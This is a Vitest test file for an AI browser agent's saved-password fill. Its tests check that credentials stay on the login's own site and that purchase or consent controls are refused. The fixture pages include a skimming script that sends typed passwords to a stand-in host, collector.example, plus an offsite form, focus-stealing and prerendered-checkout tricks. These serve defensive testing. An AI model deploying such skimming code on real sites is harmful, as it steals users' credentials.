import { vi } from 'vitest';
const dataRoot = await vi.hoisted(async () => {
  const { tmpdir: temporary } = await import('node:os');
  const { join: joined } = await import('node:path');
  return joined(temporary(), 'browser-fill-native-data');
});
vi.mock('../../config.js', async (original) => ({
  ...(await original<typeof import('../../config.js')>()),
  DATA_DIR: dataRoot,
}));
vi.mock('../../request-wake.js', () => ({ requestWake: vi.fn(async () => true) }));
import * as loginStores from './login-store.js';
import { testLoginStore } from './testing/login-store.js';
import { useAvailableBrowser } from './testing/browser-runtime.js';
/** Real owned Chrome, background windows and TLS origins; all traffic terminates in this fixture. */
import { execFileSync } from 'node:child_process';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { createServer as createHttpServer, type Server as HttpServer } from 'node:http';
import { createServer as createHttpsServer, type Server as HttpsServer } from 'node:https';
import { connect, type Socket } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { CDPSession, Frame, Page } from 'playwright-core';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { closeDb, getDb, initSqliteTestDb } from '../../db/connection.js';
import { prepareAuthenticationIsolation } from './authentication-submit.js';
import { prepareChromeProfile, spawnChrome } from './chrome.js';
import { connectChrome, type ChromeConnection } from './connection.js';
import { executeBrowserBatch } from './executor.js';
import { classifyActivation } from './commit-classifier.js';
import { readPageControlFacts } from './control-facts.js';

import { bindBrowserSecretFields, executeFillSecret, fillBoundBrowserSecrets } from './fill.js';
import './merchant-signatures.js';
import { browserConsentMigration, browserSiteLeasesMigration } from './migration.js';
import { browserSignInAssistantOnlyMigration, browserSignInMigration } from './sign-in-migration.js';
import { answerSignInReply, executeSignInCode, recoverBrowserSignInMail } from './sign-in-mail.js';
import { createAgentGroup, initTestDb, runMigrations } from '../../db/index.js';
import { registerMigration } from '../../db/migrations/index.js';
import { getSessionsByAgentGroup } from '../../db/sessions.js';
import '../gws-ea-profile/index.js';
import { recordWebAlias } from '../gws-ea-profile/testing/web-alias.js';
import { routeSignInMail } from '../gws-ea-inbox/route-mail.js';
import { parseGmailMessage } from '../gws-ea-inbox/mime.js';
import { gwsEaInboxMigration } from '../gws-ea-inbox/migration.js';
import { setActiveInbox, type InboxRuntime } from '../gws-ea-inbox/runtime.js';
import './index.js';
import type { BrowserSecretField } from './authentication-signatures.js';
import { observePage, type BrowserRef, type PinnedBrowserRef } from './observe.js';
import { browserPaths } from './paths.js';
import type { BrowserExecutionContext } from './actions.js';

registerMigration(gwsEaInboxMigration);

const chromePath = process.env.GWS_EA_BROWSER_TEST_CHROME;
/** The assistant's web alias: its email on every site. */
const ALIAS = 'tnatsissa@example.test';
const secret = 'host-only-cross-origin-fixture-value';
describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () => {
  let root: string;
  let proxy: HttpServer;
  let server: HttpsServer;
  let connection: ChromeConnection;
  let page: Page;
  let certificateSession: CDPSession;
  let logins: ReturnType<typeof testLoginStore>;
  const sockets = new Set<Socket>();
  const posts: Array<{ host: string; body: string }> = [];
  /** Reads that reached the collector's site, as a page's CDN assets load. */
  const assetReads: string[] = [];
  const parentDocuments: string[] = [];

  beforeAll(async () => {
    if (!chromePath) throw new Error('Native Chrome path required');
    root = await mkdtemp(join(tmpdir(), 'browser-fill-native-'));
    execFileSync(
      '/usr/bin/openssl',
      [
        'req',
        '-x509',
        '-newkey',
        'rsa:2048',
        '-nodes',
        '-keyout',
        join(root, 'key.pem'),
        '-out',
        join(root, 'cert.pem'),
        '-days',
        '1',
        '-subj',
        '/CN=auth.example',
      ],
      { stdio: 'ignore' },
    );
    server = createHttpsServer(
      { key: await readFile(join(root, 'key.pem')), cert: await readFile(join(root, 'cert.pem')) },
      (request, response) => {
        const host = request.headers.host ?? '';
        if (request.method === 'POST') {
          let body = '';
          request.on('data', (chunk: Buffer) => {
            body += chunk.toString();
          });
          request.on('end', () => {
            posts.push({ host, body });
            // The session form's document survives its submission, so its mirror of the value stays on screen.
            if (request.url === '/step/email')
              response
                .writeHead(200, { 'content-type': 'text/html' })
                .end(
                  '<h1>Password step</h1><form method="post" action="/step/password"><input name="username" type="hidden" value="principal@example.test"><label>Password<input name="password" type="password" autocomplete="current-password" required></label><button type="submit">Continue</button></form>',
                );
            else if (request.url === '/session' || request.url === '/send-code') response.writeHead(204).end();
            else if (request.url === '/u/login/identifier') {
              const account = new URLSearchParams(body).get('username') ?? '';
              response
                .writeHead(200, { 'content-type': 'text/html' })
                .end(
                  `<h1>Enter your password</h1><form method="post" action="/u/login/password"><input type="hidden" name="username" value="${account}"><label>Password<input name="password" type="password" autocomplete="current-password"></label><button type="submit">Continue</button></form>`,
                );
            } else if (request.url === '/code/send')
              response
                .writeHead(200, { 'content-type': 'text/html' })
                .end(
                  '<h1>Check your email</h1><form method="post" action="/code/verify"><label>Code<input name="code" inputmode="numeric"></label><button type="submit">Verify</button></form>',
                );
            else response.writeHead(200, { 'content-type': 'text/html' }).end('<h1>Signed in</h1>');
          });
        } else if (host === 'collector.example') {
          assetReads.push(request.url ?? '');
          response.writeHead(200, { 'content-type': 'text/javascript' }).end('');
        } else if (request.url === '/collecting-login') {
          // The site's own sign-in posts to its own host; a third-party script on it copies the password elsewhere.
          response.writeHead(200, { 'content-type': 'text/html' }).end(
            `<form id="sign-in"><label>Email<input name="username" type="email"></label><label>Password<input name="password" type="password"></label><button type="submit">Log in</button></form><script>
              const form = document.getElementById('sign-in');
              const password = form.querySelector('[name=password]');
              password.addEventListener('input', () => navigator.sendBeacon('https://collector.example/typed', password.value));
              form.addEventListener('submit', async (event) => {
                event.preventDefault();
                const value = password.value;
                navigator.sendBeacon('https://collector.example/beacon', JSON.stringify({ field: value }));
                fetch('https://collector.example/collect', { method: 'POST', mode: 'no-cors', body: value }).catch(() => {});
                fetch('https://collector.example/encoded', { method: 'POST', mode: 'no-cors', body: btoa(value) }).catch(() => {});
                fetch('https://collector.example/pixel?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {});
                await fetch('https://collector.example/cdn/app.js', { mode: 'no-cors' }).catch(() => {});
                // An invisible captcha checks with its own site as the form submits, and the sign-in waits for it.
                const verified = await fetch('https://captcha.example/verify', { method: 'POST', mode: 'no-cors', body: 'token=widget-token' }).then(() => true, () => false);
                if (!verified) return;
                await fetch('/sessions/create', { method: 'POST', body: new URLSearchParams(new FormData(form)) });
                location.href = '/signed-in';
              });
            </script>`,
          );
        } else if (request.url === '/otp-send' || request.url === '/otp-send-button') {
          const scripted = request.url === '/otp-send-button';
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              `<form method="post" action="/send-code"><label>Code<input name="code" type="text" autocomplete="one-time-code"></label><button id="send" type="${scripted ? 'button' : 'submit'}">Send code</button><button type="submit" formaction="/verify-code">Verify</button></form>${scripted ? '<script>document.getElementById("send").addEventListener("click", () => fetch("/send-code", {method:"POST"}));</script>' : ''}`,
            );
        } else if (request.url === '/csrf') {
          setTimeout(() => response.writeHead(200).end('fixture-token'), 1500);
        } else if (request.url === '/signed-in') {
          response.writeHead(200, { 'content-type': 'text/html' }).end('<h1>Signed in</h1>');
        } else if (request.url === '/u/login' || request.url === '/formless') {
          const fields =
            '<label>Email<input name="username" type="email" autocomplete="email webauthn" required></label><label>Password<input name="password" type="password" autocomplete="current-password" required></label><button id="go" type="submit" disabled>Log in</button>';
          response.writeHead(200, { 'content-type': 'text/html' }).end(
            `${request.url === '/formless' ? fields : `<form>${fields}</form>`}<script>
              const state = {};
              for (const input of document.querySelectorAll('input')) input.addEventListener('input', () => {
                state[input.name] = input.value;
                document.getElementById('go').disabled = !(state.username && state.password);
              });
              document.getElementById('go').addEventListener('click', async event => {
                event.preventDefault();
                await fetch('/sessions/create', { method:'POST', body:new URLSearchParams(state) });
                location.href = '/signed-in';
              });
            </script>`,
          );
        } else if (request.url === '/react-login') {
          // A React-style controlled page with no form: its state changes only through input events.
          response.writeHead(200, { 'content-type': 'text/html' }).end(
            `<div><label>Email<input name="username" type="email"></label><label>Password<input name="password" type="password"></label><div role="button" tabindex="0" id="go">Log in</div></div><script>
              const state = {};
              const native = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
              for (const input of document.querySelectorAll('input')) {
                let tracked = '';
                Object.defineProperty(input, 'value', { configurable: true,
                  get() { return native.get.call(this); }, set(value) { tracked = value; native.set.call(this, value); } });
                input.addEventListener('input', () => {
                  const current = native.get.call(input);
                  if (current === tracked) return;
                  tracked = current;
                  state[input.name] = current;
                });
              }
              document.getElementById('go').addEventListener('click', async () => {
                if (!state.username || !state.password) return;
                await fetch('/sessions/create', { method: 'POST', body: new URLSearchParams(state) });
                location.href = '/signed-in';
              });
            </script>`,
          );
        } else if (request.url === '/u/login/identifier') {
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              '<h1>Welcome</h1><form method="post" action="/u/login/identifier"><label>Email address<input name="username" type="text" autocomplete="username" inputmode="email"></label><button type="submit">Continue</button></form>',
            );
        } else if (request.url === '/offsite-login' || request.url === '/text-password') {
          const offsite = request.url === '/offsite-login';
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              `<form method="post" action="${offsite ? 'https://collector.example/login' : '/login'}"><label>Password<input name="password" type="${offsite ? 'password' : 'text'}"></label><button type="submit">Log in</button></form>`,
            );
        } else if (request.url === '/code-login') {
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              '<h1>Sign in</h1><form method="post" action="/code/send"><label>Email<input name="email" type="email"></label><button type="submit">Send code</button></form>',
            );
        } else if (request.url === '/step/email') {
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              '<h1>Email step</h1><form method="post" action="/step/email"><label>Email<input name="username" type="email" autocomplete="username" required></label><button type="submit">Next</button></form>',
            );
        } else if (request.url === '/native-get') {
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              '<form><label>Password<input name="password" type="password" autocomplete="current-password"></label><button type="submit">Log in</button></form>',
            );
        } else if (
          host === 'parent.example' &&
          (request.url?.startsWith('/help/') || request.url === '/checkout/placeorder')
        ) {
          parentDocuments.push(request.url ?? '');
          // Speculation rules ask to fetch and render a purchase before anyone navigates there.
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              request.url === '/help/speculate'
                ? '<h1>Help</h1><script type="speculationrules">{"prefetch":[{"source":"list","urls":["/checkout/placeorder"]}],"prerender":[{"source":"list","urls":["/checkout/placeorder"]}]}</script>'
                : '<h1>Order</h1>',
            );
        } else if (host === 'parent.example') {
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              request.url === '/mirror'
                ? '<h1>Account</h1><iframe src="https://auth.example/session"></iframe>'
                : `<input id="untrusted"><iframe src="https://auth.example/login"></iframe><script>document.querySelector('input').addEventListener('input', e => { document.body.dataset.captured = e.target.value; });addEventListener('message', e => { if (e.data === 'steal-focus') { document.querySelector('input').focus(); document.body.dataset.stolen = 'yes'; } });</script>`,
            );
        } else {
          const action = host === 'www.amazon.com' ? '/ap/signin' : request.url === '/session' ? '/session' : '/login';
          // A page script may copy a typed value anywhere in its own document.
          const mirror =
            request.url === '/session'
              ? `<p id="mirror"></p><script>setInterval(() => { const value = document.querySelector('input').value; if (value) document.getElementById('mirror').textContent = value; }, 5);</script>`
              : '';
          response
            .writeHead(200, { 'content-type': 'text/html' })
            .end(
              `<form id="chosen" method="post" action="${action}"><input name="password" type="password" autocomplete="current-password"><button type="submit">Sign in</button></form>${mirror}${host === 'www.amazon.com' ? "<script>Object.defineProperty(HTMLInputElement.prototype, 'value', { set() { throw new Error('page setter must not run'); } });</script>" : ''}`,
            );
        }
      },
    );
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const address = server.address();
    if (!address || typeof address === 'string') throw new Error('TLS fixture did not bind');
    proxy = createHttpServer((_request, response) => {
      response.writeHead(403).end();
    });
    // CONNECT upgrades leave closeAllConnections; retain both ends for teardown.
    proxy.on('connection', (socket) => {
      sockets.add(socket);
      socket.once('close', () => sockets.delete(socket));
    });
    proxy.on('connect', (request, socket, head) => {
      if (
        ![
          'auth.example:443',
          'login.auth.example:443',
          'parent.example:443',
          'collector.example:443',
          'captcha.example:443',
          'www.amazon.com:443',
        ].includes(request.url ?? '')
      ) {
        socket.destroy();
        return;
      }
      const upstream = connect(address.port, '127.0.0.1', () => {
        socket.write('HTTP/1.1 200 Connection Established\r\n\r\n');
        if (head.length) upstream.write(head);
        socket.pipe(upstream);
        upstream.pipe(socket);
      });
      sockets.add(upstream);
      upstream.once('close', () => sockets.delete(upstream));
      socket.on('error', () => upstream.destroy());
      upstream.on('error', () => socket.destroy());
      socket.once('close', () => upstream.destroy());
    });
    await new Promise<void>((resolve) => proxy.listen(0, '127.0.0.1', resolve));
    const proxyAddress = proxy.address();
    if (!proxyAddress || typeof proxyAddress === 'string') throw new Error('Proxy fixture did not bind');
    const paths = browserPaths(join(root, 'browser'));
    await prepareChromeProfile(paths);
    connection = await connectChrome(
      await spawnChrome({ chromePath, paths, proxyUrl: `http://127.0.0.1:${proxyAddress.port}` }),
      paths,
    );
    await prepareAuthenticationIsolation(connection.context);
  }, 30_000);

  beforeEach(async () => {
    logins = testLoginStore(join(root, 'browser'));
    for (const login of await logins.store.all()) await logins.store.remove(login.id, login.version);
    vi.spyOn(loginStores, 'getLoginStore').mockResolvedValue(logins.store);
    useAvailableBrowser();
    vi.stubEnv('GWS_EA_BROWSER_ROOT', join(root, 'browser'));
    await browserSiteLeasesMigration.up(await initSqliteTestDb());
    await browserSignInMigration.up(getDb());
    await browserSignInAssistantOnlyMigration.up(getDb());
    await getDb().exec(
      "CREATE TABLE gws_ea_browser_jobs(id TEXT PRIMARY KEY); INSERT INTO gws_ea_browser_jobs VALUES('native-fill-job')",
    );
    await browserConsentMigration.up(getDb());
    posts.length = 0;
    assetReads.length = 0;
    parentDocuments.length = 0;
    const appeared = connection.context.waitForEvent('page');
    await connection.session.send('Target.createTarget', { url: 'about:blank', newWindow: true, background: true });
    page = await appeared;
    certificateSession = await connection.context.newCDPSession(page);
    await certificateSession.send('Security.setIgnoreCertificateErrors', { ignore: true });
  });
  afterEach(async () => {
    await recoverBrowserSignInMail();
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    await certificateSession?.detach();
    await page?.close();
    await closeDb();
  });
  afterAll(async () => {
    await connection?.close();
    for (const socket of sockets) socket.destroy();
    server?.closeAllConnections();
    proxy?.closeAllConnections();
    await Promise.all([
      new Promise<void>((resolve) => server?.close(() => resolve())),
      new Promise<void>((resolve) => proxy?.close(() => resolve())),
    ]);
    if (root) await rm(root, { recursive: true, force: true });
  });

  function context(): BrowserExecutionContext {
    return {
      page: async () => page,
      assertActive: async () => undefined,
      runtime: { closeJob: async () => page.close() },
      job: { id: 'native-fill-job' },
      request: { id: 'native-fill-request' },
      store: { db: getDb() },
      signal: new AbortController().signal,
      remaining: () => 10_000,
      wakeWaiters: async () => undefined,
    } as unknown as BrowserExecutionContext;
  }
  async function savedFill(item: string, fields: readonly ('username' | 'password')[]) {
    return executeFillSecret(context(), {
      item_handle: item,
      ...(await refsFor({
        ...Object.fromEntries(fields.map((field) => [field, field === 'username' ? 'Email' : 'Password'])),
        submit:
          fields.length === 1 && fields[0] === 'username'
            ? 'Next'
            : fields.length === 1 && page.url().endsWith('/step/email')
              ? 'Continue'
              : 'Log in',
      })),
    });
  }

  /** The current refs for these accessible names, as the browser agent reads them. */
  async function refsFor(names: Record<string, string>): Promise<Record<string, BrowserRef>> {
    const observation = await observePage(page);
    return Object.fromEntries(
      Object.entries(names).map(([key, label]) => {
        const line = observation.snapshot.split('\n').find((candidate) => candidate.includes(`"${label}"`));
        const ref = line?.match(/\[ref=([^\]]+)\]/u)?.[1];
        if (!ref) throw new Error(`Missing ${label} reference`);
        return [key, { ref, generation: observation.generation }];
      }),
    );
  }
  async function saved(site: string) {
    return logins.store.create({ site, title: 'Saved login', username: 'principal@example.test', password: secret });
  }

  for (const path of ['/u/login', '/formless', '/react-login'])
    it(`signs in through a controlled ${path} page on a sign-in host of the login's own site`, async () => {
      const item = await saved('auth.example');
      await page.goto(`https://login.auth.example${path}`);
      const result = await executeFillSecret(context(), {
        item_handle: item.id,
        ...(await refsFor({ username: 'Email', password: 'Password', submit: 'Log in' })),
      });
      await expect.poll(() => posts.length).toBe(1);
      expect(posts[0].host).toBe('login.auth.example');
      expect(Object.fromEntries(new URLSearchParams(posts[0].body))).toEqual({
        username: 'principal@example.test',
        password: secret,
      });
      await expect.poll(() => page.locator('h1').textContent()).toBe('Signed in');
      expect(['submitted', 'cleared_after_submit']).toContain(result.status);
      expect(JSON.stringify({ result, observation: await observePage(page) })).not.toContain(secret);
    });

  it('fills the username alone for the agent to press Continue, then fills and submits the password page', async () => {
    const item = await saved('auth.example');
    await page.goto('https://login.auth.example/u/login/identifier');
    expect(
      await executeFillSecret(context(), {
        item_handle: item.id,
        ...(await refsFor({ username: 'Email address' })),
      }),
    ).toEqual({ status: 'filled' });
    expect(posts).toEqual([]);
    expect(await page.locator('input[name=username]').inputValue()).toBe('principal@example.test');
    expect(JSON.stringify(await observePage(page))).not.toContain('principal@example.test');
    // The account is no host secret: the agent's own press goes ahead.
    const { next } = await refsFor({ next: 'Continue' });
    expect(
      await executeBrowserBatch(context(), { actions: [{ kind: 'click', ...next }] }, { record: false }),
    ).toMatchObject({ status: 'stopped', reason: 'navigated' });
    await expect.poll(() => page.locator('h1').textContent()).toBe('Enter your password');
    expect(
      await executeFillSecret(context(), {
        item_handle: item.id,
        ...(await refsFor({ password: 'Password', submit: 'Continue' })),
      }),
    ).toMatchObject({ status: 'submitted' });
    expect(posts.map((post) => Object.fromEntries(new URLSearchParams(post.body)))).toEqual([
      { username: 'principal@example.test' },
      { username: 'principal@example.test', password: secret },
    ]);
    expect(await page.locator('h1').textContent()).toBe('Signed in');
  });

  it('never puts a saved password into a field that shows text', async () => {
    const item = await saved('auth.example');
    const read = vi.spyOn(logins.store, 'secret');
    await page.goto('https://auth.example/text-password');
    await expect(
      executeFillSecret(context(), {
        item_handle: item.id,
        ...(await refsFor({ password: 'Password', submit: 'Log in' })),
      }),
    ).rejects.toMatchObject({ code: 'forbidden' });
    expect(read).not.toHaveBeenCalled();
    expect(await page.locator('input').inputValue()).toBe('');
    expect(posts).toEqual([]);
  });

  it('refuses a password field that turns to text before the write, without resolving into it', async () => {
    const item = await saved('auth.example');
    await page.goto('https://auth.example/native-get');
    await page.locator('form').evaluate((node) => node.setAttribute('method', 'post'));
    const chosen = await refsFor({ password: 'Password', submit: 'Log in' });
    const read = logins.store.secret.bind(logins.store);
    vi.spyOn(logins.store, 'secret').mockImplementation(async (...args) => {
      await page.evaluate("document.querySelector('input').type = 'text'");
      return read(...args);
    });
    expect(await executeFillSecret(context(), { item_handle: item.id, ...chosen })).toEqual({
      status: 'origin_mismatch',
    });
    expect(await page.locator('input').inputValue()).toBe('');
    expect(posts).toEqual([]);
  });

  it("keeps a filled password on the login's site when its form posts to another", async () => {
    const item = await saved('auth.example');
    await page.goto('https://auth.example/offsite-login');
    expect(
      await executeFillSecret(context(), {
        item_handle: item.id,
        ...(await refsFor({ password: 'Password', submit: 'Log in' })),
      }),
    ).toEqual({ status: 'origin_mismatch' });
    await page.waitForTimeout(500);
    expect(posts).toEqual([]);
    expect(page.url()).not.toContain('collector.example');
    expect(await page.content()).not.toContain(secret);
  });

  it("keeps a filled password off other sites while the page's captcha and CDN requests still go", async () => {
    const item = await saved('auth.example');
    await page.goto('https://login.auth.example/collecting-login');
    const result = await executeFillSecret(context(), {
      item_handle: item.id,
      ...(await refsFor({ username: 'Email', password: 'Password', submit: 'Log in' })),
    });
    await expect.poll(() => page.locator('h1').textContent()).toBe('Signed in');
    expect(posts).toEqual([
      { host: 'captcha.example', body: 'token=widget-token' },
      {
        host: 'login.auth.example',
        body: new URLSearchParams({ username: 'principal@example.test', password: secret }).toString(),
      },
    ]);
    expect(assetReads).toEqual(['/cdn/app.js']);
    // Refused copies are the page's own business: the sign-in itself went through on the login's site.
    expect(result).toEqual({ status: 'submitted' });
  });

  it('refuses a login saved for another site, saying which', async () => {
    const item = await saved('parent.example');
    const read = vi.spyOn(logins.store, 'secret');
    await page.goto('https://auth.example/u/login');
    const result = await executeFillSecret(context(), {
      item_handle: item.id,
      ...(await refsFor({ username: 'Email', password: 'Password', submit: 'Log in' })),
    });
    expect(result).toEqual({ status: 'origin_mismatch', reason: expect.stringContaining('parent.example') });
    expect(result.reason).toContain('auth.example');
    expect(read).not.toHaveBeenCalled();
    expect(posts).toEqual([]);
  });

  for (const transition of ['navigation', 'same-document'] as const) {
    it(`uses fresh references for email then password steps after ${transition}`, async () => {
      const item = await logins.store.create({
        site: 'auth.example',
        title: 'Saved login',
        username: 'principal@example.test',
        password: secret,
      });
      await page.goto('https://auth.example/step/email');
      if (transition === 'same-document')
        await page.evaluate(`
        document.querySelector('form').addEventListener('submit', async event => {
          event.preventDefault();
          const response = await fetch('/step/email', {
            method: 'POST', body: new URLSearchParams(new FormData(event.target))
          });
          document.body.innerHTML = await response.text();
          const account = document.querySelector('input[name=username]');
          account.type = 'email';
          account.readOnly = true;
        });
      `);
      expect(await savedFill(item.id, ['username'])).toMatchObject({
        status: transition === 'navigation' ? 'submitted' : 'cleared_after_submit',
      });
      await expect.poll(() => page.locator('h1').textContent()).toBe('Password step');
      expect(JSON.stringify(await observePage(page))).not.toContain('principal@example.test');
      expect(await savedFill(item.id, ['password'])).toMatchObject({ status: 'submitted' });
      expect(posts.map((post) => Object.fromEntries(new URLSearchParams(post.body)))).toEqual([
        { username: 'principal@example.test' },
        { username: 'principal@example.test', password: secret },
      ]);
      expect(await page.locator('h1').textContent()).toBe('Signed in');
    });
  }

  it('never submits a saved password in a native GET address', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Saved login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/native-get');
    await savedFill(item.id, ['password']);
    expect(page.url()).toBe('https://auth.example/native-get');
    expect(posts).toEqual([]);
    expect(await page.locator('input').inputValue()).toBe('');
  });

  it('refuses a saved login edited between resolving its grouped fields', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Saved login',
      username: 'principal@example.test',
      password: secret,
    });
    const read = logins.store.secret.bind(logins.store);
    vi.spyOn(logins.store, 'secret').mockImplementation(async (...args) => {
      const value = await read(...args);
      if (args[1] === 'username')
        await logins.store.update(item.id, item.version, {
          username: 'changed@example.test',
          password: 'changed-fixture-password',
        });
      return value;
    });
    await page.goto('https://auth.example/u/login');
    expect(await savedFill(item.id, ['username', 'password'])).toEqual({ status: 'origin_mismatch' });
    expect(posts).toEqual([]);
    expect(await page.locator('input[name=username]').inputValue()).toBe('');
    expect(await page.locator('input[name=password]').inputValue()).toBe('');
  });

  it('reclassifies a sign-in control that turns into a purchase during input callbacks', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Saved login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/u/login');
    await page.evaluate(`
      document.querySelector('input[name=password]').addEventListener('input', () => {
        document.getElementById('go').textContent = 'Pay now';
        const username = document.querySelector('input[name=username]').value;
        const mirror = document.createElement('p');
        mirror.textContent = username;
        document.body.append(mirror);
        const copy = document.createElement('input');
        copy.type = 'hidden';
        copy.name = 'copied-account';
        copy.value = username;
        document.body.append(copy);
      });
    `);
    await expect(savedFill(item.id, ['username', 'password'])).rejects.toMatchObject({ code: 'forbidden' });
    expect(posts).toEqual([]);
    expect(await page.locator('input[name=username]').inputValue()).toBe('');
    expect(await page.locator('input[name=copied-account]').inputValue()).toBe('');
    expect(await page.locator('input[name=password]').inputValue()).toBe('');
    expect(await page.locator('p').textContent()).toBe('principal@example.test');
    expect(JSON.stringify(await observePage(page))).not.toContain('principal@example.test');
    expect(
      await executeBrowserBatch(context(), { actions: [{ kind: 'screenshot' }] }, { record: false }),
    ).toMatchObject({
      status: 'stopped',
      reason: 'secret_field',
    });
  });

  it('clears the account identifier when an input callback invalidates a filled credential group', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Saved login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/u/login');
    await page.evaluate(
      "document.querySelector('input[name=password]').addEventListener('input', event => { event.target.value = ''; });",
    );
    await expect(savedFill(item.id, ['username', 'password'])).rejects.toMatchObject({ code: 'forbidden' });
    expect(posts).toEqual([]);
    expect(await page.locator('input[name=username]').inputValue()).toBe('');
    expect(await page.locator('input[name=password]').inputValue()).toBe('');
  });

  it('reclassifies after a consent callback changes the sign-in control', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/u/login');
    await page.evaluate(`
      document.querySelector('form').insertAdjacentHTML('beforeend', '<label><input id="terms" type="checkbox" required>I accept the Terms of Service</label>');
      let choices = 0;
      document.getElementById('terms').addEventListener('change', event => {
        if (event.target.checked && ++choices === 2) document.getElementById('go').textContent = 'Pay now';
      });
      document.querySelector('input[name=password]').addEventListener('input', () => { document.getElementById('terms').checked = false; });
    `);
    await expect(savedFill(item.id, ['username', 'password'])).rejects.toMatchObject({ code: 'forbidden' });
    expect(await page.locator('#go').textContent()).toBe('Pay now');
    expect(posts).toEqual([]);
    expect(await page.locator('input[name=password]').inputValue()).toBe('');
  });

  it('returns a recorded consent stop before reading saved credentials', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Login',
      username: 'principal@example.test',
      password: secret,
    });
    const read = vi.spyOn(logins.store, 'secret');
    await page.goto('https://auth.example/u/login');
    await page.evaluate(
      `document.querySelector('form').insertAdjacentHTML('beforeend', '<label><input type="checkbox" required>I agree to binding arbitration</label>');`,
    );
    const result = await savedFill(item.id, ['username', 'password']);
    expect(result).toMatchObject({
      status: 'stopped',
      reason: 'consent_required',
      consent: [{ stop_id: expect.any(String), site: 'auth.example' }],
    });
    const stops = await getDb().all<{ id: string }>('SELECT id FROM gws_ea_browser_consent_stops');
    expect(result.consent).toMatchObject([{ stop_id: stops[0]?.id }]);
    expect(read).not.toHaveBeenCalled();
    expect(posts).toEqual([]);
    expect(JSON.stringify(result)).not.toContain(secret);
  });

  it('uses the submitter POST override while still cancelling an effective GET', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/native-get');
    await page.locator('button').evaluate((node) => node.setAttribute('formmethod', 'post'));
    await savedFill(item.id, ['password']);
    expect(posts.map((post) => Object.fromEntries(new URLSearchParams(post.body)))).toEqual([{ password: secret }]);
    await page.goto('https://auth.example/native-get');
    await page.locator('form').evaluate((node) => node.setAttribute('method', 'post'));
    await page.locator('button').evaluate((node) => node.setAttribute('formmethod', 'get'));
    await savedFill(item.id, ['password']);
    expect(posts).toHaveLength(1);
    expect(page.url()).toBe('https://auth.example/native-get');
  });

  it('keeps a code binding usable while Send code is disabled for cooldown', async () => {
    await page.goto('https://auth.example/otp-send-button');
    const target = await page.locator('input').elementHandle();
    const submit = await page.locator('button[type=submit]').elementHandle();
    if (!target || !submit) throw new Error('Missing code controls');
    const bound = await bindBrowserSecretFields(
      page,
      [{ field: 'code', target: { element: target, frame: page.mainFrame() } as PinnedBrowserRef }],
      { element: submit, frame: page.mainFrame() } as PinnedBrowserRef,
      'auth.example',
    );
    await page.locator('#send').evaluate((node) => {
      (node as unknown as { disabled: boolean }).disabled = true;
    });
    expect(await fillBoundBrowserSecrets(context(), bound, async () => ['123456'])).toEqual({ status: 'submitted' });
    expect(posts.map((post) => Object.fromEntries(new URLSearchParams(post.body)))).toEqual([{ code: '123456' }]);
  });

  it('lets a slow token callback read the filled form before cleanup', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/u/login');
    await page.evaluate(`
      const old = document.getElementById('go');
      old.replaceWith(old.cloneNode(true));
      document.getElementById('go').addEventListener('click', async event => {
        event.preventDefault();
        await fetch('/csrf');
        await fetch('/sessions/create', {method:'POST', body:new URLSearchParams(new FormData(document.querySelector('form')))});
        location.href = '/signed-in';
      });
    `);
    await savedFill(item.id, ['username', 'password']);
    await expect.poll(() => posts.length).toBe(1);
    expect(Object.fromEntries(new URLSearchParams(posts[0].body))).toEqual({
      username: 'principal@example.test',
      password: secret,
    });
    await expect.poll(() => page.locator('h1').textContent()).toBe('Signed in');
  });

  it('allows a login beside a separate checkout and still refuses its purchase', async () => {
    const item = await logins.store.create({
      site: 'auth.example',
      title: 'Login',
      username: 'principal@example.test',
      password: secret,
    });
    await page.goto('https://auth.example/u/login');
    await page.evaluate(
      `document.body.insertAdjacentHTML('beforeend', '<form id="checkout"><p>Total: $42.00</p><p>Visa ending in 4242</p><button type="submit">Place order</button></form>');`,
    );
    const login = await page.locator('#go').elementHandle();
    const purchase = await page.locator('#checkout button').elementHandle();
    if (!login || !purchase) throw new Error('Missing controls');
    expect(await readPageControlFacts(page, login)).toMatchObject({
      transaction: true,
      region: { transaction: false },
    });
    expect(await classifyActivation(page, purchase)).toBe('purchase_control');
    await savedFill(item.id, ['username', 'password']);
    expect(posts).toHaveLength(1);
    expect(Object.fromEntries(new URLSearchParams(posts[0].body))).toEqual({
      username: 'principal@example.test',
      password: secret,
    });
  });

  for (const enabled of [true, false]) {
    it(`handles a control that ${enabled ? 'enables after validation' : 'stays disabled'} without repeated submission`, async () => {
      const item = await logins.store.create({
        site: 'auth.example',
        title: 'Login',
        username: 'principal@example.test',
        password: secret,
      });
      await page.goto('https://auth.example/u/login');
      await page.evaluate(
